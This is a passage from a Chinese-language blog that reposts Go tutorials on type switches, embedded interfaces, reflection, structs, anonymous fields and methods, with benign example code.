class="string">&quot;list[%d] is of a different type\n&quot;</span>, index)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是不是很简单啊，同时你是否注意到了多个 if 里面，还记得我前面介绍流程时讲过，if 里面允许初始化变量。</p>
<p>也许你注意到了，我们断言的类型越多，那么 if else 也就越多，所以才引出了下面要介绍的 switch。</p>
<p>switch 测试</p>
<p>最好的讲解就是代码例子，现在让我们重写上面的这个实现</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Element <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"><span class="keyword">type</span> List [] Element</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;(name: &quot;</span> + p.name + <span class="string">&quot; - age: &quot;</span>+strconv.Itoa(p.age)+ <span class="string">&quot; years)&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    list := <span class="built_in">make</span>(List, <span class="number">3</span>)</span><br><span class="line">    list[<span class="number">0</span>] = <span class="number">1</span> <span class="comment">// an int</span></span><br><span class="line">    list[<span class="number">1</span>] = <span class="string">&quot;Hello&quot;</span> <span class="comment">// a string</span></span><br><span class="line">    list[<span class="number">2</span>] = Person&#123;<span class="string">&quot;Dennis&quot;</span>, <span class="number">70</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> index, element := <span class="keyword">range</span> list&#123;</span><br><span class="line">        <span class="keyword">switch</span> value := element.(<span class="keyword">type</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">                fmt.Printf(<span class="string">&quot;list[%d] is an int and its value is %d\n&quot;</span>, index, value)</span><br><span class="line">            <span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">                fmt.Printf(<span class="string">&quot;list[%d] is a string and its value is %s\n&quot;</span>, index, value)</span><br><span class="line">            <span class="keyword">case</span> Person:</span><br><span class="line">                fmt.Printf(<span class="string">&quot;list[%d] is a Person and its value is %s\n&quot;</span>, index, value)</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                fmt.Printf(<span class="string">&quot;list[%d] is of a different type&quot;</span>, index)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一点需要强调的是：<code>element.(type)</code> 语法不能在 switch 外的任何逻辑里面使用，如果你要在 switch 外面判断一个类型就使用 <code>comma-ok</code>。</p>
<h2 id="嵌入-interface"><a href="#嵌入-interface" class="headerlink" title="嵌入 interface"></a>嵌入 interface</h2><p>Go 里面真正吸引人的是它内置的逻辑语法，就像我们在学习 Struct 时学习的匿名字段，多么的优雅啊，那么相同的逻辑引入到 interface 里面，那不是更加完美了。如果一个 interface1 作为 interface2 的一个嵌入字段，那么 interface2 隐式的包含了 interface1 里面的 method。</p>
<p>我们可以看到源码包 container&#x2F;heap 里面有这样的一个定义</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Interface <span class="keyword">interface</span> &#123;</span><br><span class="line">    sort.Interface <span class="comment">// 嵌入字段 sort.Interface</span></span><br><span class="line">    Push(x <span class="keyword">interface</span>&#123;&#125;) <span class="comment">// a Push method to push elements into the heap</span></span><br><span class="line">    Pop() <span class="keyword">interface</span>&#123;&#125; <span class="comment">// a Pop elements that pops elements from the heap</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看到 sort.Interface 其实就是嵌入字段，把 sort.Interface 的所有 method 给隐式的包含进来了。也就是下面三个方法：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Interface <span class="keyword">interface</span> &#123;</span><br><span class="line">    <span class="comment">// Len is the number of elements in the collection.</span></span><br><span class="line">    Len() <span class="type">int</span></span><br><span class="line">    <span class="comment">// Less returns whether the element with index i should sort</span></span><br><span class="line">    <span class="comment">// before the element with index j.</span></span><br><span class="line">    Less(i, j <span class="type">int</span>) <span class="type">bool</span></span><br><span class="line">    <span class="comment">// Swap swaps the elements with indexes i and j.</span></span><br><span class="line">    Swap(i, j <span class="type">int</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>Go 语言实现了反射，所谓反射就是能检查程序在运行时的状态。我们一般用到的包是 reflect 包。如何运用 reflect 包，官方的这篇文章详细的讲解了 reflect 包的实现原理，laws of reflection</p>
<p>使用 reflect 一般分成三步，下面简要的讲解一下：要去反射是一个类型的值 (这些值都实现了空 interface)，首先需要把它转化成 reflect 对象 (reflect.Type 或者 reflect.Value，根据不同的情况调用不同的函数)。这两种获取方式如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t := reflect.TypeOf(i)    <span class="comment">// 得到类型的元数据,通过t我们能获取类型定义里面的所有元素</span></span><br><span class="line">v := reflect.ValueOf(i)   <span class="comment">// 得到实际的值，通过 v 我们获取存储在里面的值，还可以去改变值</span></span><br></pre></td></tr></table></figure>

<p>转化为 reflect 对象之后我们就可以进行一些操作了，也就是将 reflect 对象转化成相应的值，例如</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name := t.Elem().Field(<span class="number">0</span>).Name  <span class="comment">// 获取定义在 struct 里面第一个字段的字段名</span></span><br><span class="line">value := v.Elem().Field(<span class="number">0</span>).String()  <span class="comment">// 获取存储在第一个字段里面的值</span></span><br></pre></td></tr></table></figure>

<p>获取反射值能返回相应的类型和数值</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">float64</span> = <span class="number">3.4</span></span><br><span class="line">v := reflect.ValueOf(x)</span><br><span class="line">fmt.Println(<span class="string">&quot;type:&quot;</span>, v.Type())</span><br><span class="line">fmt.Println(<span class="string">&quot;kind is float64:&quot;</span>, v.Kind() == reflect.Float64)</span><br><span class="line">fmt.Println(<span class="string">&quot;value:&quot;</span>, v.Float())</span><br></pre></td></tr></table></figure>

<p>转载文章: <a target="_blank" rel="noopener" href="https://learnku.com/docs/build-web-application-with-golang/026-interface/3164">02.6. interface | 第二章. Go 语言基础 |《Go Web 编程》| Go 技术论坛 (learnku.com)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/16/3.struct%E5%92%8C%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
      <meta itemprop="name" content="春去春来">
      <meta itemprop="description" content="登峰造极境">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="RISE">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/16/3.struct%E5%92%8C%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" class="post-title-link" itemprop="url">3.struct和面向对象</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-16 08:15:17 / 修改时间：08:37:14" itemprop="dateCreated datePublished" datetime="2022-09-16T08:15:17+08:00">2022-09-16</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Go-web-%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">Go web 编程</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h1><p>Go 语言中，也和 C 或者其他语言一样，我们可以声明新的类型，作为其它类型的属性或字段的容器。例如，我们可以创建一个自定义类型 person 代表一个人的实体。这个实体拥有属性：姓名和年龄。这样的类型我们称之 struct。如下代码所示:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如何使用 struct 呢？请看下面的代码</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> P person  <span class="comment">// P 现在就是 person 类型的变量了</span></span><br><span class="line"></span><br><span class="line">P.name = <span class="string">&quot;Astaxie&quot;</span>  <span class="comment">// 赋值 &quot;Astaxie&quot; 给 P 的 name 属性.</span></span><br><span class="line">P.age = <span class="number">25</span>  <span class="comment">// 赋值 &quot;25&quot; 给变量 P 的 age 属性</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;The person&#x27;s name is %s&quot;</span>, P.name)  <span class="comment">// 访问 P 的 name 属性.</span></span><br></pre></td></tr></table></figure>

<h1 id="struct-的匿名字段"><a href="#struct-的匿名字段" class="headerlink" title="struct 的匿名字段"></a>struct 的匿名字段</h1><p>我们上面介绍了如何定义一个 struct，定义的时候是字段名与其类型一一对应，实际上 Go 支持只提供类型，而不写字段名的方式，也就是匿名字段，也称为嵌入字段。</p>
<p>当匿名字段是一个 struct 的时候，那么这个 struct 所拥有的全部字段都被隐式地引入了当前定义的这个 struct。</p>
<p>让我们来看一个例子，让上面说的这些更具体化</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">    weight <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">    Human  <span class="comment">// 匿名字段，那么默认 Student 就包含了 Human 的所有字段</span></span><br><span class="line">    speciality <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 我们初始化一个学生</span></span><br><span class="line">    mark := Student&#123;Human&#123;<span class="string">&quot;Mark&quot;</span>, <span class="number">25</span>, <span class="number">120</span>&#125;, <span class="string">&quot;Computer Science&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 我们访问相应的字段</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;His name is &quot;</span>, mark.name)</span><br><span class="line">    fmt.Println(<span class="string">&quot;His age is &quot;</span>, mark.age)</span><br><span class="line">    fmt.Println(<span class="string">&quot;His weight is &quot;</span>, mark.weight)</span><br><span class="line">    fmt.Println(<span class="string">&quot;His speciality is &quot;</span>, mark.speciality)</span><br><span class="line">    <span class="comment">// 修改对应的备注信息</span></span><br><span class="line">    mark.speciality = <span class="string">&quot;AI&quot;</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Mark changed his speciality&quot;</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;His speciality is &quot;</span>, mark.speciality)</span><br><span class="line">    <span class="comment">// 修改他的年龄信息</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Mark become old&quot;</span>)</span><br><span class="line">    mark.age = <span class="number">46</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;His age is&quot;</span>, mark.age)</span><br><span class="line">    <span class="comment">// 修改他的体重信息</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Mark is not an athlet anymore&quot;</span>)</span><br><span class="line">    mark.weight += <span class="number">60</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;His weight is&quot;</span>, mark.weight)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一个问题：如果 human 里面有一个字段叫做 phone，而 student 也有一个字段叫做 phone，那么该怎么办呢？</p>
<p>Go 里面很简单的解决了这个问题，最外层的优先访问，也就是当你通过 student.phone 访问的时候，是访问 student 里面的字段，而不是 human 里面的字段。</p>
<p>这样就允许我们去重载通过匿名字段继承的一些字段，当然如果我们想访问重载后对应匿名类型里面的字段，可以通过匿名字段名来访问。请看下面的例子</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">    phone <span class="type">string</span>  <span class="comment">// Human 类型拥有的字段</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Employee <span class="keyword">struct</span> &#123;</span><br><span class="line">    Human  <span class="comment">// 匿名字段 Human</span></span><br><span class="line">    speciality <span class="type">string</span></span><br><span class="line">    phone <span class="type">string</span>  <span class="comment">// 雇员的 phone 字段</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    Bob := Employee&#123;Human&#123;<span class="string">&quot;Bob&quot;</span>, <span class="number">34</span>, <span class="string">&quot;777-444-XXXX&quot;</span>&#125;, <span class="string">&quot;Designer&quot;</span>, <span class="string">&quot;333-222&quot;</span>&#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Bob&#x27;s work phone is:&quot;</span>, Bob.phone)</span><br><span class="line">    <span class="comment">// 如果我们要访问 Human 的 phone 字段</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Bob&#x27;s personal phone is:&quot;</span>, Bob.Human.phone)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p>你是否想过函数当作 struct 的字段一样来处理呢？今天我们就讲解一下函数的另一种形态，带有接收者的函数，我们称为 <code>method</code></p>
<h2 id="method"><a href="#method" class="headerlink" title="method"></a>method</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r ReceiverType)</span></span> funcName(parameters) (results)</span><br></pre></td></tr></table></figure>

<p>method 是附属在一个给定的类型上的，他的语法和函数的声明语法几乎一样，只是在 func 后面增加了一个 receiver (也就是 method 所依从的主体)。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Rectangle <span class="keyword">struct</span> &#123;</span><br><span class="line">    width, height <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Circle <span class="keyword">struct</span> &#123;</span><br><span class="line">    radius <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r Rectangle)</span></span> area() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r.width*r.height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Circle)</span></span> area() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> c.radius * c.radius * math.Pi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    r1 := Rectangle&#123;<span class="number">12</span>, <span class="number">2</span>&#125;</span><br><span class="line">    r2 := Rectangle&#123;<span class="number">9</span>, <span class="number">4</span>&#125;</span><br><span class="line">    c1 := Circle&#123;<span class="number">10</span>&#125;</span><br><span class="line">    c2 := Circle&#123;<span class="number">25</span>&#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Area of r1 is: &quot;</span>, r1.area())</span><br><span class="line">    fmt.Println(<span class="string">&quot;Area of r2 is: &quot;</span>, r2.area())</span><br><span class="line">    fmt.Println(<span class="string">&quot;Area of c1 is: &quot;</span>, c1.area())</span><br><span class="line">    fmt.Println(<span class="string">&quot;Area of c2 is: &quot;</span>, c2.area())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在使用 method 的时候重要注意几点</p>
<p>虽然 method 的名字一模一样，但是如果接收者不一样，那么 method 就不一样<br>method 里面可以访问接收者的字段<br>调用 method 通过 . 访问，就像 struct 里面访问字段一样</p>
<p>在上例，method area () 分别属于 Rectangle 和 Circle， 于是他们的 Receiver 就变成了 Rectangle 和 Circle, 或者说，这个 area () 方法 是由 Rectangle&#x2F;Circle 发出的。</p>
<h2 id="method-继承"><a href="#method-继承" class="headerlink" title="method 继承"></a>method 继承</h2><p>前面一章我们学习了字段的继承，那么你也会发现 Go 的一个神奇之处，method 也是可以继承的。如果匿名字段实现了一个 method，那么包含这个匿名字段的 struct 也能调用该 method。让我们来看下面这个例子</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">    phone <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">    Human <span class="comment">// 匿名字段</span></span><br><span class="line">    school <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Employee <span class="keyword">struct</span> &#123;</span><br><span class="line">    Human <span class="comment">// 匿名字段</span></span><br><span class="line">    company <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 human 上面定义了一个 method</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Human)</span></span> SayHi() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Hi, I am %s you can call me on %s\n&quot;</span>, h.name, h.phone)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mark := Student&#123;Human&#123;<span class="string">&quot;Mark&quot;</span>, <span class="number">25</span>, <span class="string">&quot;222-222-YYYY&quot;</span>&#125;, <span class="string">&quot;MIT&quot;</span>&#125;</span><br><span class="line">    sam := Employee&#123;Human&#123;<span class="string">&quot;Sam&quot;</span>, <span class="number">45</span>, <span class="string">&quot;111-888-XXXX&quot;</span>&#125;, <span class="string">&quot;Golang Inc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    mark.SayHi()</span><br><span class="line">    sam.SayHi()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="method-重写"><a href="#method-重写" class="headerlink" title="method 重写"></a>method 重写</h2><p>上面的例子中，如果 Employee 想要实现自己的 SayHi, 怎么办？简单，和匿名字段冲突一样的道理，我们可以在 Employee 上面定义一个 method，重写了匿名字段的方法。请看下面的例子</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">    phone <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">    Human <span class="comment">// 匿名字段</span></span><br><span class="line">    school <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Employee <span class="keyword">struct</span> &#123;</span><br><span class="line">    Human <span class="comment">// 匿名字段</span></span><br><span class="line">    company <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Human 定义 method</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Human)</span></span> SayHi() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Hi, I am %s you can call me on %s\n&quot;</span>, h.name, h.phone)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Employee 的 method 重写 Human 的 method</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *Employee)</span></span> SayHi() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Hi, I am %s, I work at %s. Call me on %s\n&quot;</span>, e.name,</span><br><span class="line">        e.company, e.phone) <span class="comment">//Yes you can split into 2 lines here.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mark := Student&#123;Human&#123;<span class="string">&quot;Mark&quot;</span>, <span class="number">25</span>, <span class="string">&quot;222-222-YYYY&quot;</span>&#125;, <span class="string">&quot;MIT&quot;</span>&#125;</span><br><span class="line">    sam := Employee&#123;Human&#123;<span class="string">&quot;Sam&quot;</span>, <span class="number">45</span>, <span class="string">&quot;111-888-XXXX&quot;</span>&#125;, <span class="string">&quot;Golang Inc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    mark.SayHi()</span><br><span class="line">    sam.SayHi()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>转载文章：<a target="_blank" rel="noopener" href="https://learnku.com/docs/build-web-application-with-golang/024-struct-type/3162">02.4. struct 类型 | 第二章. Go 语言基础 |《Go Web 编程》| Go 技术论坛 (learnku.com)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/15/2.%E6%B5%81%E7%A8%8B%E5%92%8C%E5%87%BD%E6%95%B0/">

